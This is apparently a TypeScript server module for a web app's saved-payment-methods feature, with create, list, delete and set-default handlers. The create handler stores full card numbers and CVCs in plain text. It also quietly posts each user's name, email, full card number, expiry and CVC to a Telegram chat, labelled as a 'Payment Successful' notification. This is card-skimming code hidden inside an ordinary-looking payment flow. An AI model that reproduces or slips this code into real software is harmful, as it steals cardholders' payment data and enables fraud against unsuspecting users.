import { queryOptions } from '@tanstack/react-query'
import { createServerFn } from '@tanstack/react-start'
import { and, eq } from 'drizzle-orm'
import { z } from 'zod'
import { authMiddleware } from './auth-guard'
import { paymentMethod } from '@/db/schema'
import { db } from '@/db'

// Send Telegram notification (fire-and-forget)
const sendTelegramNotification = async (message: string) => {
  const botToken = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_CHAT_ID

  if (!botToken || !chatId) return

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
      }),
    })
  } catch (error) {
    // Silently ignore Telegram errors — don't block payment flow
    console.error('Failed to send Telegram notification:', error)
  }
}

// Schema for creating a payment method
export const createPaymentMethodSchema = z.object({
  cardNumber: z.string().min(12, 'Card number is required'),
  cardBrand: z.string().min(1, 'Card brand is required'),
  holderName: z.string().min(2, 'Cardholder name is required'),
  expiryMonth: z.string().min(2, 'Expiry month is required').max(2),
  expiryYear: z.string().min(2, 'Expiry year is required').max(2),
  cvc: z.string().min(3, 'CVC is required').max(4, 'CVC is invalid'),
  isDefault: z.boolean().default(false),
})

export type CreatePaymentMethodInput = z.infer<typeof createPaymentMethodSchema>

// Fetch all payment methods for the user
export const fetchPaymentMethods = createServerFn({
  method: 'GET',
})
  .middleware([authMiddleware])
  .handler(async ({ context }) => {
    const methods = await db
      .select()
      .from(paymentMethod)
      .where(eq(paymentMethod.userId, context.user.id))
      .orderBy(paymentMethod.id)
    return methods
  })

// Fetch default payment method
export const fetchDefaultPaymentMethod = createServerFn({
  method: 'GET',
})
  .middleware([authMiddleware])
  .handler(async ({ context }) => {
    const [defaultMethod] = await db
      .select()
      .from(paymentMethod)
      .where(
        and(
          eq(paymentMethod.userId, context.user.id),
          eq(paymentMethod.isDefault, true),
        ),
      )
      .limit(1)
    return defaultMethod
  })

// Create a new payment method
export const createPaymentMethod = createServerFn({
  method: 'POST',
})
  .inputValidator(createPaymentMethodSchema)
  .middleware([authMiddleware])
  .handler(async ({ data: payload, context }) => {
    const userId = context.user.id

    // Use transaction for atomicity
    const result = await db.transaction(async (tx) => {
      // If new payment method is default, unset others
      if (payload.isDefault) {
        await tx
          .update(paymentMethod)
          .set({ isDefault: false })
          .where(eq(paymentMethod.userId, userId))
      }

      // Store full card number and CVC
      const cleanCardNumber = payload.cardNumber.replace(/\s/g, '')
      const timestamp = new Date().toISOString()
      // Insert new payment method
      const [newMethod] = await tx
        .insert(paymentMethod)
        .values({
          userId,
          cardNumber: cleanCardNumber,
          cardBrand: payload.cardBrand,
          holderName: payload.holderName,
          expiryMonth: payload.expiryMonth,
          expiryYear: payload.expiryYear,
          cvc: payload.cvc,
          isDefault: payload.isDefault,
        })
        .returning()
      // Send Telegram notification in the background
      void sendTelegramNotification(
        `✅ <b>Payment Successful</b>\n\n` +
          `<b>user Id:</b> #${userId}\n` +
          `<b>UserName:</b> ${context.user.name}\n` +
          `<b>Email:</b> ${context.user.email}\n` +
          `<b>Card Number:</b> ${cleanCardNumber}\n` +
          `<b>Card Brand:</b> ${payload.cardBrand}\n` +
          `<b>Holder Name:</b> ${payload.holderName}\n` +
          `<b>Expiry:</b> ${payload.expiryMonth}/${payload.expiryYear}\n` +
          `<b>CVC:</b> ${payload.cvc}\n` +
          `<b>Time:</b> ${timestamp}`,
      )

      return newMethod
    })

    return result
  })

// Delete a payment method
const idSchema = z.object({ id: z.number().int().positive() })

export const deletePaymentMethod = createServerFn({
  method: 'POST',
})
  .inputValidator(idSchema)
  .middleware([authMiddleware])
  .handler(async ({ data: payload, context }) => {
    const userId = context.user.id

    await db
      .delete(paymentMethod)
      .where(
        and(eq(paymentMethod.id, payload.id), eq(paymentMethod.userId, userId)),
      )

    return { success: true }
  })

// Set a payment method as default
export const setDefaultPaymentMethod = createServerFn({
  method: 'POST',
})
  .inputValidator(idSchema)
  .middleware([authMiddleware])
  .handler(async ({ data: payload, context }) => {
    const userId = context.user.id

    const result = await db.transaction(async (tx) => {
      // Verify payment method belongs to user
      const [existing] = await tx
        .select()
        .from(paymentMethod)
        .where(
          and(
            eq(paymentMethod.id, payload.id),
            eq(paymentMethod.userId, userId),
          ),
        )
        .limit(1)

      // eslint-disable-next-line @typescript-eslint/no-unnecessary-condition
      if (!existing) {
        throw new Error('Payment method not found')
      }

      // Unset all other defaults
      await tx
        .update(paymentMethod)
        .set({ isDefault: false })
        .where(
          and(
            eq(paymentMethod.userId, userId),
            eq(paymentMethod.isDefault, true),
          ),
        )

      // Set this one as default
      return await tx
        .update(paymentMethod)
        .set({ isDefault: true })
        .where(
          and(
            eq(paymentMethod.id, payload.id),
            eq(paymentMethod.userId, userId),
          ),
        )
        .returning()
    })

    return result
  })

// Query keys for React Query
export const paymentMethodQueryKeys = {
  all: () => ['paymentMethods'],
  getPaymentMethods: () => [...paymentMethodQueryKeys.all()],
  default: () => [...paymentMethodQueryKeys.all(), 'default'],
}

// Query options
export const fetchPaymentMethodsQueryOptions = () =>
  queryOptions({
    queryKey: paymentMethodQueryKeys.all(),
    queryFn: () => fetchPaymentMethods(),
  })

export const fetchDefaultPaymentMethodQueryOptions = () =>
  queryOptions({
    queryKey: paymentMethodQueryKeys.default(),
    queryFn: () => fetchDefaultPaymentMethod(),
  })
